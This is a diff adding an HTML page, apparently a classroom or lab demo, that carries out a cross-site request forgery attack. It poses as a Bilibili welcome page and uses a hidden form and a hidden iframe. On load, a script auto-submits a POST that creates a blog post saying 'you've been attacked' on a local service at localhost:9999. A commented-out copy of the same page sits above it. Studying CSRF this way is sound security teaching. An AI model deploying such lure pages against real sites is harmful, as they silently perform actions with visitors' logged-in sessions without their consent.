@@ -1,0 +1,44 @@
+<!-- <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>b站</title>
+</head>
+<body>
+    <h1>欢迎b站</h1>
+    <iframe src="" style="display:none;" name="abc"></iframe>
+    <form target="abc" action="http://localhost:9999/blog/add" method="post" id="a">
+        <input type="text" name="title" value="你被攻击 ~">
+        <textarea name="content">你被攻击了，被攻击了，攻击了，击了，了！</textarea>
+        <input type="radio" name="is_show" value="1">公开
+    </form>
+</body>
+</html>
+<script>
+    document.getElementById("a").submit();
+</script> -->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+
+    <h1>欢迎 b 站</h1>
+
+    <iframe style="display:none;" src="" name="abc"></iframe>
+
+    <form target="abc" id="a" style="display:none;" method="post" action="http://localhost:9999/blog/add">
+        <input type="text" name="title" value="你被攻击 ~">
+        <textarea name="content" >你被攻击了，被攻击了，攻击了，击了，了，</textarea>
+        <input type="text" name="is_show" value="1">
+    </form>
+
+</body>
+</html>
+
+<script>
+    document.getElementById("a").submit();
+</script>
